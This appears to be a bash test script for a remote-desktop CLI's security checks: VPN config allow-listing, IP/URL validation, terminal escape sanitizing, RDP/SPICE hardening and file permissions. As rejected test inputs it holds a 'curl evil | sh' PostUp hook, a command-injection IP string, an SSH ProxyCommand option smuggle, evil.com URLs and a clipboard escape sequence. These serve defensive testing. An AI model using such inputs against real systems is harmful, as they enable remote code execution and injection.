#!/usr/bin/env bash
# The CLI's basic security checks: VPN config, IPs and URLs, terminal output, RDP/SPICE files,
# file permissions.
# shellcheck source=common.sh
source "$(dirname "$0")/common.sh"

echo "== VPN config allow-list"
if [[ -f "$REAL_VPN" ]]; then ok check_vpn_conf "$(cat "$REAL_VPN")"; else skip "your VPN config (none here)"; fi
good=$'[Interface]\nAddress = 10.2.0.5/32\nPrivateKey = abc=\nMTU = 1420\n\n[Peer]\nPublicKey = def=\nEndpoint = h:443\nAllowedIPs = 10.2.0.0/16\nPersistentKeepalive = 25'
ok  check_vpn_conf "$good"
bad check_vpn_conf "$good"$'\nPostUp = curl evil | sh'
bad check_vpn_conf "${good/MTU = 1420/PreUp=id}"
bad check_vpn_conf "$good"$'\nDNS = 1.1.1.1'
bad check_vpn_conf "${good/10.2.0.0\/16/0.0.0.0\/0}"
bad check_vpn_conf "${good/10.2.0.0\/16/10.2.0.0\/16, ::\/0}"
bad check_vpn_conf "$good"$'\nTable = off'
bad check_vpn_conf "$good"$'\ngarbage line'
ok  check_vpn_conf "${good/10.2.0.0\/16/10.2.0.0\/16, 10.3.0.0\/20}"

echo "== IP / URL validation"
ok  valid_ipv4 10.2.118.7
bad valid_ipv4 '1.2.3.4/22; touch /tmp/pwned #'
bad valid_ipv4 '-oProxyCommand=x'
ok  valid_url https://elmeuescriptori.gestioeducativa.gencat.cat
bad valid_url http://elmeuescriptori.gestioeducativa.gencat.cat
bad valid_url 'https://evil.com/x'
bad valid_url 'https://a.com@evil.com'

echo "== /dev/tcp probe takes the IP as an argument, not code"
timeout 2 bash -c '</dev/tcp/$1/22' _ "1.2.3.4/22; touch $T/pwned #" 2>/dev/null
check "injected command didn't run" '[[ ! -e "$T/pwned" ]]'

echo "== terminal sanitizing"
check "sanitize"  '[[ "$(sanitize $'"'"'a\e]52;c;ZXZpbA==\ab'"'"')" == "a]52;c;ZXZpbA==b" ]]'
check "JQ_CLEAN"  '[[ "$(jq -rn "$JQ_CLEAN"'"'"' "x\u001b[2Jy" | clean'"'"')" == "x?[2Jy" ]]'

echo "== RDP file hardening (IsardVDI default custom block)"
rdp=$'full address:s:10.2.0.9\nredirectprinters:i:1\nredirectcomports:i:0\nredirectsmartcards:i:1\nredirectclipboard:i:1\ndrivestoredirect:s:*\nusbdevicestoredirect:s:*\naudiocapturemode:i:1\nsmart sizing:i:1'
out=$(printf '%s\n' "$rdp" | harden_rdp 0)
check "no redirection survives"   '! grep -qE "^(redirect[a-z]+:i:1|[a-z]*storedirect:s:.+|audiocapturemode:i:1)$" <<<"$out"'
check "other settings kept"       'grep -qx "full address:s:10.2.0.9" <<<"$out" && grep -qx "smart sizing:i:1" <<<"$out"'
check "clipboard off, once"       '[[ $(grep -c "^redirectclipboard" <<<"$out") == 1 ]] && grep -qx "redirectclipboard:i:0" <<<"$out"'
check "clipboard on when asked"   'printf "%s\n" "$rdp" | harden_rdp 1 | grep -qx "redirectclipboard:i:1"'

echo "== SPICE file hardening (IsardVDI default custom block)"
vv=$'[virt-viewer]\ntype=spice\nhost=h\npassword=p\nenable-smartcard=1\nenable-usb-autoshare=1\nusb-filter=-1,-1,-1,-1,1\ndelete-this-file=1'
out=$(printf '%s\n' "$vv" | harden_vv 0)
check "no device sharing survives" '! grep -qE "^(enable-smartcard|enable-usb-autoshare|enable-usbredir)=1|^usb-filter" <<<"$out"'
check "layout kept"                '[[ $(sed -n 2p <<<"$out") == enable-usbredir=0 ]] && grep -qx "password=p" <<<"$out"'

echo "== private files"
chmod 755 "$CONF_DIR"; printf x > "$TOKEN_FILE"; chmod 644 "$TOKEN_FILE"
secure_conf 2>/dev/null
check "secure_conf: dir 700, token 600" '[[ $(stat -c %a "$CONF_DIR") == 700 && $(stat -c %a "$TOKEN_FILE") == 600 ]]'
chmod 644 "$TOKEN_FILE"; printf 'new' | write_secret "$TOKEN_FILE"
check "write_secret: mode 600, content" '[[ $(stat -c %a "$TOKEN_FILE") == 600 && $(cat "$TOKEN_FILE") == new ]]'
check "write_secret: no temp file left" '[[ -z $(find "$CONF_DIR" -name "token.*") ]]'

echo "== SSO helper must not be writable by others"
mkdir -p "$T/share"; printf 'x' > "$T/share/sso_login.py"; chmod 775 "$T/share"; chmod 666 "$T/share/sso_login.py"
check_helper "$T/share/sso_login.py"
check "check_helper fixes permissions" '[[ $(stat -c %a "$T/share") == 755 && $(stat -c %a "$T/share/sso_login.py") == 644 ]]'

finish
